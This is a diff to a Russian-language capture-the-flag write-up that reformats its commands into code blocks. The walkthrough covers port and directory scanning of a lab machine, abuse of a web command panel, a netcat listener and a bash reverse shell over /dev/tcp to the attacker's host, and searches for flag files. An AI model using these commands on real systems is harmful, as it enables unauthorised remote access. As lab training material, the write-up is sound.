@@ -18,7 +18,9 @@
 
 После запуска машинки и подключение к oVpn, первым делом я решил отсканировать все порты с помощью nmap, команды выглядела так:
 
-```nmap -sV -T4 10.114.151.146 -p-```
+```bash
+nmap -sV -T4 10.114.151.146 -p-
+```
 
 ![oops, problems with load](images/nmap.jpg)
 
@@ -30,7 +32,9 @@
 Теперь я решил использовать ```gobuster``` для поиска других страниц, использую как словарь небольшую таблицу common.txt
 Сервер был на Apache, поэтому я решил искать не только папки, но и другие расширения популярные на Apache:
 
-```gobuster dir -u http://10.114.151.146 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt```
+```bash
+gobuster dir -u http://10.114.151.146 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
+```
 
 ![oops, problems with load](images/GoBuster.jpg)
 
@@ -42,7 +46,7 @@
 
 ![oops, problems with load](images/LoginPage.jpg)
 
-Мне не понадобилось заходить на другие страницы, ведь после логина меня перекинуло прямо в ```[portal.php](http://10.114.151.146/portal.php)``` (куда раньше доступ мне был закрыт) где была командная строка
+Мне не понадобилось заходить на другие страницы, ведь после логина меня перекинуло прямо в ```http://10.114.151.146/portal.php``` (куда раньше доступ мне был закрыт) где была командная строка
 
 В первую очередь я решил посмотреть кто я, где я и какие у меня права. ```whoami``` показало мне что я ```www-data```, ```pwd``` показал мне что я в ```/var/www/html```
 а ```sudo -l``` показал мне, что у меня есть доступ использовать все команды без ввода пароля. В первую очередь я решил получить **reverse-shell**
@@ -52,13 +56,17 @@
 Сначала я решил использовать netcat, открыть порт с помощью -lvp и с помощью -e /bin/sh получить шелл,
 но видимо на сервере не было netcat или с ним были проблемы, поэтому я решил попробовать bash, в первую очередь я решил открыть 4444-ый порт на kali:
 
-```nc -lvp 4444```
+```bash
+nc -lvp 4444
+```
 
 ![oops, problems with load](images/netcatLVP.jpg)
 
 теперь попробую подключится на kali с цели:
 
-```bash -c 'bash -i >& /dev/tcp/192.168.166.222/4444 0>&1'```
+```bash
+bash -c 'bash -i >& /dev/tcp/192.168.166.222/4444 0>&1'
+```
 
 ![oops, problems with load](images/CommandPanel.jpg)
 
@@ -75,15 +83,21 @@
 ![oops, problems with load](images/FirstFlag.jpg)
 
 Теперь решил поискать с помощью find, введя команду
-```find / -name "*flag*" 2>/dev/null```
+```bash
+find / -name "*flag*" 2>/dev/null
+```
 
 Я получил огромный вывод, но в итоге ничего не нашёл,
 поэтому я решил попробовать сделать тоже самое, но со словом ingredient, введя команду:
-```find / -name "*ingredient*" 2>/dev/null```
+```bash
+find / -name "*ingredient*" 2>/dev/null
+```
 
 И в итоге я смог найти второй ингредиент, который находился в /home/rick/second ingredients
 Теперь мне нужно узнать его, я решил ввести:
-```cat "/home/rick/second ingredients"```
+```bash
+cat "/home/rick/second ingredients"
+```
 
 И так я получил второй флаг, теперь время найти третий..
 
